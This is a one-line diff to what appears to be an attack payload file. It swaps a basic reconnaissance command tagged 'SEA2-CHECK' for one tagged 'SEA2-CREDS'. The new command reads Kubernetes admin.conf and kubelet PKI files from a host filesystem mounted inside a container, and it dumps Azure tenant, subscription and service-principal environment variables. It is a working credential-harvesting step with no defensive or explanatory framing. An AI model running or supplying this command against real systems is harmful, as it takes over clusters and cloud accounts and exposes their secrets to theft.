@@ -1,1 +1,1 @@
-id; hostname; cat /etc/hostname # SEA2-CHECK
+find /host/etc/kubernetes/ -name "*.conf" 2>/dev/null; ls /host/etc/kubernetes/*.conf 2>/dev/null; cat /host/etc/kubernetes/admin.conf 2>/dev/null | head -5; ls /host/var/lib/kubelet/pki/ 2>/dev/null | head -5; env | grep -iE "AZURE|ARM|SP_|TENANT|SUBSCRIPTION" | head -10 # SEA2-CREDS
